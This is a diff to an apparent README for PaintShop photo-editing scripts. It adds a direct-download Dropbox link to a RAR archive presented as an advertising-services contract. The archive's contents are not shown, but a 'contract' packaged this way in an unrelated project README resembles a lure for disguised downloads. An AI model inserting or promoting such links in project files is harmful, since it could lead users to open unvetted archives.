@@ -44,7 +44,7 @@ Reduce repetition and accelerate complex photo-editing actions with Scripts. Rec
 <summary>✅ Partnership and Collaboration:</summary>
     
  #### <div dir="rtl">:Contract for the provision of advertising services </div>
- [💾 Download]()
+ [💾 Download](https://www.dropbox.com/s/6vnih3k9qwozftw/Service%20Contract%20PaintShop.rar?dl=1)
  
 </details></div>
 
